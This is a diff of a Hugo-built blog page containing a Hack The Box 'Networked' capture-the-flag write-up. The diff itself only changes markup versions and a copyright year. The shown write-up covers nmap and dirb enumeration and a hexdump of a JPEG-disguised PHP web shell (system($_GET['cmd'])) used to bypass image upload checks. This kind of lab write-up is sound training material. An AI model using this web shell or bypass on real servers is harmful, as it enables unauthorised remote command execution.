@@ -56,7 +56,7 @@
     <link rel="icon" type="image/png" href="https://joegraham.co/images/favicon-32x32.png" sizes="32x32">
     <link rel="icon" type="image/png" href="https://joegraham.co/images/favicon-16x16.png" sizes="16x16">
 
-    <meta name="generator" content="Hugo 0.83.1" />
+    <meta name="generator" content="Hugo 0.92.0" />
   </head>
 
   <body class=" ">
@@ -122,7 +122,7 @@
 it was fairly easy, I got some good practice with command injection vulnerabilities and circumventing file verification methods.</p>
 <h1 id="enumeration">Enumeration</h1>
 <p>Let&rsquo;s start by taking a look at what services are running on the box using nmap.</p>
-<pre><code>Starting Nmap 7.80 ( https://nmap.org ) at 2019-08-30 16:16 EDT
+<pre tabindex="0"><code>Starting Nmap 7.80 ( https://nmap.org ) at 2019-08-30 16:16 EDT
 Nmap scan report for 10.10.10.146
 Host is up (0.26s latency).
 Not shown: 65532 filtered ports
@@ -139,7 +139,7 @@ reveals this page:</p>
 <p><img src="https://joegraham.co/posts/networked/index_page.png" alt="index page, generic text with no links"></p>
 <p>Since there isn&rsquo;t really anything useful on this page, lets throw dirb at the site to see if we can
 find any other pages.</p>
-<pre><code>root@kali:networked# dirb http://10.10.10.146 /usr/share/wordlists/dirb/big.txt
+<pre tabindex="0"><code>root@kali:networked# dirb http://10.10.10.146 /usr/share/wordlists/dirb/big.txt
 -----------------
 DIRB v2.22    
 By The Dark Raver
@@ -169,7 +169,7 @@ DOWNLOADED: 40916 - FOUND: 1
 </code></pre><p>We have two useful directories: backup and uploads. The uploads directory is not listable, and the index.html page has a single
 &ldquo;.&rdquo; as its content, so it&rsquo;s not useful to us right now. The backup directory is listable though, and contains a single
 backup.tar file that we can download and extract.</p>
-<pre><code>root@kali:downloads# tar -xvf backup.tar
+<pre tabindex="0"><code>root@kali:downloads# tar -xvf backup.tar
 index.php
 lib.php
 photos.php
@@ -196,7 +196,7 @@ this check. This may have been an avenue for exploitation, but I chose not to lo
 <p>Looking more closely at the file verification code, we can see that either finfo_file or mime_content_type is called on the file to check
 to see if the file uploaded is actually an image. Experimenting with uploads, I found that it&rsquo;s possible to fool both of these function calls
 by crafting a file that contains the file signature for a JPEG and has a .jpg extension on the end but contains PHP code within it.</p>
-<pre><code>root@kali:80# xxd payload.php.jpg
+<pre tabindex="0"><code>root@kali:80# xxd payload.php.jpg
 00000000: ffd8 ffe0 0010 4a46 4946 0001 0a3c 3f70  ......JFIF...&lt;?p
 00000010: 6870 2065 6368 6f20 7379 7374 656d 2824  hp echo system($
 00000020: 5f47 4554 5b27 636d 6427 5d29 3b20 3f3e  _GET['cmd']); ?&gt;
@@ -268,7 +268,7 @@ into systemd network scripts. Overall, this was a fairly easy box that reinforce
       <footer class="footer">
   <section class="container">
     
-     © 2021
+     © 2022
     
        · 
       Powered by <a href="https://gohugo.io/">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/">Coder</a>.
